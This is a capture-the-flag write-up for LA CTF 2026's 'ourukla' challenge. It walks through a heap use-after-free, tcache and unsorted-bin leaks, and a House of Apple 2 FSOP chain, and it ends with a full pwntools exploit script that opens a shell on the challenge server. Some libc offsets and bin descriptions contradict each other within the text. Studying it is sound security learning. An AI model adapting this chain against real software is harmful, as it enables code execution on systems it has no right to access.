+++
title = "ourukla: heap UAF to FSOP (LA CTF 2026)"
date = 2026-02-10
summary = "Full exploit chain from scratch: tcache safe-linking leak, unsorted-bin libc leak, a UAF write that plants a fake sinfo, corrupts _IO_list_all, and pops a shell via House of Apple 2."
tags = ["pwn", "fsop", "ctf"]
+++

I picked this one up towards the end of LA CTF 2026. Remote-only binary, Debian Bookworm glibc (2.36). The challenge is a small student-registry CRUD app that looks clean until you notice one very deliberate misuse of the heap allocator. Everything in the exploit chain flows from that one line.

**Downloads:** [chall](/assets/downloads/ourukla/chall) | [chall.c](/assets/downloads/ourukla/chall.c) | [Dockerfile](/assets/downloads/ourukla/Dockerfile)

---

## Protections

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Full RELRO rules out GOT overwrites. No free/malloc hooks (removed in glibc 2.34). The only exit path is `exit(1)` when the menu receives an invalid option, which is going to be our FSOP trigger later.

---

## Reading the Source

The challenge ships the C source, which is a gift. Two structs matter:

```c
struct student_info {
    char noeditingmyptrs[0x10]; // offset 0x00
    char *name;                  // offset 0x10
    unsigned long attributes;    // offset 0x18
    char major[0x40];            // offset 0x20
    char aux[0x90];              // offset 0x60
};  // sizeof = 0xF0, malloc chunk 0x100

struct student {
    unsigned long array_id;      // 0x00
    unsigned long uid;           // 0x08
    struct student_info *sinfo;  // 0x10
};  // sizeof = 0x18, malloc chunk 0x20
```

`remove_student` frees `sinfo->name`, then `sinfo`, then the struct, sets `ourUKLA[i] = NULL`. Looks clean. Then I read `add_student`:

```c
void add_student() {
    char *old_top = *((char**)puts + (0x166580/8)) + 0x10;
    struct student *s = ourUKLA[cur_index] = malloc(sizeof(struct student));
    if ((void *)old_top == (void *)s) s->sinfo = NULL;
    // ...
}
```

That `old_top` line is the entire bug. `puts + 0x166580 = main_arena.top` (hard-coded libc offset), so `old_top` is the top chunk address *before* the allocation. The check zeroes `s->sinfo` only if the struct came from the heap top. If it came from tcache instead (a recycled freed slot), `s->sinfo` is never touched, and it keeps whatever value the chunk held before it was freed.

UAF. When I free a student and re-add them, the new struct's `sinfo` still points at the old freed `student_info`. Then `fill_student_info` will use it:

```c
void fill_student_info(struct student *s) {
    struct student_info *sinfo;
    if (s->sinfo == NULL) sinfo = malloc(sizeof(struct student_info));
    else sinfo = s->sinfo;    // dangling pointer if from tcache
    // writes name, major, attributes, aux into *sinfo
}
```

That is the primitive. The question is what we can do with it.

---

## Exploit Plan

No GOT overwrite, no hooks. The natural target is `_IO_list_all`, which lets us trigger FSOP on `exit(1)`. To get there I need:

1. Libc base leak (for `_IO_list_all`, `system`, and vtable offsets)
2. Heap base leak (tcache safe-linking decode and future address math)
3. A write to plant `IO_list_all - 0x10` where it will become a future struct's `sinfo`
4. A fake FILE struct and a House of Apple 2 trigger

---

## Libc Leak

For a libc leak I need a chunk to land in the [unsorted bin](https://github.com/shellphish/how2heap), where glibc writes `main_arena+X` as the fd/bk pair. tcache caps at 7 entries per size class. By freeing 8 chunks of the same size, the 8th overflows into the unsorted bin.

The tricky part is reading the libc pointer back through `show`. The show path goes: `student->sinfo->name`, then `printf("%s", sinfo->name)`. So I need a dangling chain:

- A live student whose `sinfo` field dangles to a freed sinfo that is in the unsorted bin
- That freed sinfo's `name` field points to a freed name buffer that is also in the unsorted bin
- The name buffer's fd is the libc address

Two hops. The heap layout has to be set up carefully. Here is the feng shui:

```python
add(1, True)   # advance cur_index with a live student

# add structs 2-9 without sinfo, then free them all
batch(*([('a', i) for i in range(2, 10)] +
       [('f', i) for i in range(2, 10)]))
# 7 structs fill tcache[0x20], struct_9 spills to fastbin

# re-add 2-9 WITH sinfo
# each pops a recycled struct from tcache; UAF fires
# new sinfos and names allocate from heap top in sequence
for i in range(2, 10): add(i, True)

# free students 2-9 (add student 10 to advance cur_index)
batch(('a', 10), *[('f', i) for i in range(2, 10)])
# 7 names fill tcache[0x110], name[9] spills to unsorted bin
# 7 sinfos fill tcache[0x100], sinfo[9] spills to unsorted bin

# drain tcache[0x20] and tcache[0x110] by re-adding 2-8
for i in range(2, 9): add(i, True)

# add student 11 via batch (pops struct_9 from fastbin, not heap top)
batch(('a', 11))
```

After this setup, `student_11.sinfo` dangles to freed `sinfo[9]` (unsorted bin). `sinfo[9]->name` dangles to freed `name[9]` (also unsorted bin). `name[9]`'s user-data is the unsorted bin fd, a libc address.

For more on how the unsorted bin works, the [shellphish/how2heap](https://github.com/shellphish/how2heap) repo has worked examples, and [this heap overview](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/) from Azeria Labs covers the bin structure well.

```python
show(11)
raw = io.recvline()[:-1].ljust(8, b'\x00')
libc_base = u64(raw) - 0x1e6c20   # OFF_UNSORTED_BIN confirmed from the libc
```

Check the bin state in pwndbg after the final batch and before show:

```
pwndbg> bins
pwndbg> x/4gx &main_arena
```

<img src="/assets/media/ourukla/cp1-bins.jpg" alt="pwndbg bins output: tcachebins 0x100 [7] full, smallbins 0x210 holding the libc pointer" style="max-width:100%;display:block;margin:1.5em 0">

The seven `0x100` sinfo chunks fill tcache exactly. The eighth (sinfo[9]) lands in `smallbins[0x210]`: its fd is `main_arena+X`, a live libc address. Reading `sinfo[11]->name` through `show(11)` hands us that pointer directly.

<img src="/assets/media/ourukla/cp1-mappings.jpg" alt="pwndbg info proc mappings and libc offset computation" style="max-width:100%;display:block;margin:1.5em 0">

Computing the base from the leak: `libc_base = leaked_fd - 0x1e6d20`. Verified against the mapping: `libc.so.6` loads at `0x7f1139b90000`, offset `0x1e6d20` puts us squarely in the `main_arena` region.

---

## Heap Leak

glibc 2.32+ uses [safe-linking](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/) to protect the tcache freelist. The fd pointer stored in a freed chunk is XOR'd with the chunk address shifted right 12 bits:

```
fd_stored = fd_real XOR (chunk_addr >> 12)
```

If a chunk is the *only* entry in its size class, `fd_real = NULL`, so `fd_stored = chunk_addr >> 12`. Reading that back and shifting left gives the chunk address. From there you can derive the heap base.

To read a tcache fd, I need the UAF:

```python
add(0, True)                # alloc struct_0, sinfo[0], name[0]
batch(('f', 0), ('a', 0))   # free all three; re-add struct_0 without sinfo
show(0)
```

After `free(0)`, the three chunks land in their respective tcache bins:

```
tcache[0x20]  : struct_0
tcache[0x100] : sinfo[0]
tcache[0x110] : name[0]
```

Re-`add(0)` pops `struct_0` from `tcache[0x20]`. Because it came from tcache, the old_top check does not fire. `s->sinfo` is still the freed `sinfo[0]`. That freed sinfo still has `sinfo[0]->name = name[0]` (freed, sitting in `tcache[0x110]`).

`show(0)` prints `sinfo[0]->name`, which is the user-data of `name[0]`, which is the safe-linked tcache fd:

```python
safe_fd = u64(io.recvline().strip().ljust(8, b'\x00'))
heap_base = (safe_fd << 12) - 0x1000
```

Confirm it in pwndbg after the setup and before `show`:

```
pwndbg> vis_heap_chunks
pwndbg> bins
```

<video autoplay loop muted playsinline style="max-width:100%;display:block;margin:1.5em 0">
  <source src="/assets/media/ourukla/exploit.mp4" type="video/mp4">
</video>

<p style="text-align:center;font-style:italic;margin:-0.5em 0 1.5em">Ik I'm cooking when my pwn guys are losing their shit.</p>

---

## The Write Primitive

This is the part that took me the longest. The goal is to write `IO_list_all - 0x10` into a heap location that will later be interpreted as `struct_14->sinfo`.

```python
add(12, True,
    name=b"A"*8,
    major=b"A"*8,
    aux_data=p64(libc_base + OFF_IO_LIST_ALL - 0x10))
add(13)
```

Here is what happens internally. When `add(12)` runs, `struct_12` is allocated from `tcache[0x20]` (recycled slot from earlier feng shui). tcache, not heap top, so old_top check does not fire. `struct_12->sinfo` retains the stale pointer from that slot's last use: a freed 0x110-sized name buffer at a specific heap address.

`fill_student_info` sees `s->sinfo != NULL` and uses the dangling pointer directly. It then writes `aux_data` to `sinfo->aux` = `sinfo + 0x60`.

The critical overlap: at this point in the heap layout, `sinfo + 0x60` is the same address as `future_struct_14 + 0x10`, the `sinfo` field of a struct that does not exist yet. The write plants `IO_list_all - 0x10` there ahead of time. `add(13)` just advances `cur_index` past this region.

Confirm after `add(12)`:

```
pwndbg> x/2gx <sinfo12_addr+0x60>
# should be: libc_base + OFF_IO_LIST_ALL - 0x10
```

---

## FSOP via House of Apple 2

[House of Apple 2](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/) forges a `_IO_FILE` whose `_wide_data` vtable points at `_IO_wfile_jumps`, causing `_IO_wdoallocbuf` to call `_IO_buf_base(fp)` with the FILE pointer as argument. Put `system` at `_IO_buf_base` and your shell command at the start of the FILE and that is a shell. No ROP, no stack, no libc function pointer hooks.

`add(14, True, fake_file)` closes the loop:

`struct_14` is allocated from tcache. No old_top check. `struct_14->sinfo = IO_list_all - 0x10` (the value planted in Stage 3). `fill_student_info` sees a non-null sinfo and skips the sinfo malloc entirely. Then:

```c
char *name = malloc(0x100);    // lands at heap_base + 0x26C0
read(name, 0x100);             // writes fake_file bytes here
sinfo->name = name;
// sinfo       = IO_list_all - 0x10
// sinfo->name = *(IO_list_all - 0x10 + 0x10)
//             = *IO_list_all  <-- overwritten with heap_base+0x26C0
```

`_IO_list_all` now points to our fake FILE at `heap_base + 0x26C0`.

```python
fake_file = flat({
    0x00: b"aa;sh\x00",             # _flags: "aa;" passes flag checks, "sh" is the shell
    0x28: p64(1),                    # _IO_write_ptr > _IO_write_base
    0x68: p64(libc_base + OFF_SYSTEM),
    0x88: p64(libc_base + OFF_IO_STDFILE_0_LOCK),
    0xA0: p64(heap_base + 0x26C0 - 0x10),   # _wide_data ptr
    0xD0: p64(heap_base + 0x26C0),           # _wide_data->_IO_write_base (self-ref)
    0xD8: p64(libc_base + OFF_IO_WFILE_JUMPS),
}, filler=b"\x00")
```

After `add(14)`:

```
pwndbg> x/gx &_IO_list_all
# 0x...26C0  (heap_base + 0x26C0)
pwndbg> x/20gx heap_base+0x26C0
# fake FILE struct: flags "aa;sh", system ptr, vtable, etc.
```

Send option 4, `exit(1)` fires, `_IO_flush_all_lockp` walks `_IO_list_all`, hits the fake FILE, dispatches through `_IO_wfile_jumps`, calls `system("aa;sh")`, shell pops.

---

## Full Exploit

```python
from pwn import *
context.log_level = 'critical'

OFF_IO_LIST_ALL       = 0x1e74c0
OFF_SYSTEM            = 0x53110
OFF_IO_STDFILE_0_LOCK = 0x1e87c0
OFF_IO_WFILE_JUMPS    = 0x1e5228
OFF_UNSORTED_BIN      = 0x1e6c20

try:
    io = remote("chall.lac.tf", 31147)
except:
    io = process("./chall")

def add(uid, add_sinfo=False, name=b"X"*0x100, major=b"Y"*0x40,
        attributes=1, aux_data=b""):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(uid).encode())
    io.sendlineafter(b": ", b"y" if add_sinfo else b"n")
    if add_sinfo:
        io.sendafter(b": ", name)
        io.sendafter(b": ", major)
        io.sendlineafter(b": ", str(attributes).encode())
        io.sendlineafter(b"? ", b"y" if aux_data != b"" else b"n")
        if aux_data != b"":
            io.sendafter(b": ", aux_data)

def show(uid):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(uid).encode())

def batch(*ops):
    io.recvuntil(b"> ")
    buf = b''
    for op, uid in ops:
        if op == 'a': buf += f"1\n{uid}\nn\n".encode()
        elif op == 'f': buf += f"3\n{uid}\n".encode()
    io.send(buf)
    for _ in range(len(ops) - 1): io.recvuntil(b"> ")

# Stage 1: libc leak
add(1, True)
batch(*([('a', i) for i in range(2, 10)] + [('f', i) for i in range(2, 10)]))
for i in range(2, 10): add(i, True)
batch(('a', 10), *[('f', i) for i in range(2, 10)])
for i in range(2, 9): add(i, True)
batch(('a', 11))
show(11)
io.recvuntil(b": ")
libc_base = u64(io.recvline()[:-1].ljust(8, b"\x00")) - OFF_UNSORTED_BIN

# Stage 2: heap leak
add(0, True)
batch(('f', 0), ('a', 0))
show(0)
io.recvuntil(b": ")
heap_base = (u64(io.recvline().strip().ljust(8, b"\x00")) << 12) - 0x1000

# Stage 3: plant IO_list_all-0x10 in future struct_14's sinfo field
add(12, True, name=b"A"*8, major=b"A"*8,
    aux_data=p64(libc_base + OFF_IO_LIST_ALL - 0x10))
add(13)

# Stage 4: fake FILE and FSOP
fake_file = flat({
    0x00: b"aa;sh\x00",
    0x08: p64(0),
    0x20: p64(0),
    0x28: p64(1),
    0x68: p64(libc_base + OFF_SYSTEM),
    0x88: p64(libc_base + OFF_IO_STDFILE_0_LOCK),
    0xA0: p64(heap_base + 0x26C0 - 0x10),
    0xC0: p64(0),
    0xD0: p64(heap_base + 0x26C0),
    0xD8: p64(libc_base + OFF_IO_WFILE_JUMPS),
}, filler=b"\x00")
add(14, True, fake_file)

io.sendlineafter(b"> ", b"4")
io.sendline(b"cat flag.txt")
io.interactive()
```

<img src="/assets/media/ourukla/flag-drop.png" alt="Flag drop in team chat" style="border:none;max-width:100%;height:auto;display:block;margin:1.5em 0">

`lactf{w0w_y0u_s0lv3d_m3_heap_heap_hurray}`

---

## Takeaways

The old_top trick is subtle. The check `s == old_top` fires only once per chunk: the first time it comes from the heap top. The moment a struct is freed and recycled through tcache, the guard is permanently bypassed for that chunk. Every subsequent recycle of that slot has a stale `sinfo` waiting to be used.

tcache [safe-linking](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/) (glibc 2.32+) makes heap leaks harder but not impossible. For a chain tail (fd = NULL), the stored fd is `chunk_addr >> 12`. Shift back and subtract the offset to recover the heap base.

The 7-entry tcache cap is not just a size limit. Carefully filling a size class and freeing one more chunk is a reliable way to get a chunk into the unsorted bin and pick up a libc pointer from it.

FSOP via [House of Apple 2](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/) is the go-to primitive on modern glibc with Full RELRO and no hooks. One 8-byte write to `_IO_list_all` and a controlled fake FILE is all it takes. Refer to the [shellphish/how2heap](https://github.com/shellphish/how2heap) repo for worked examples of all the heap techniques above.
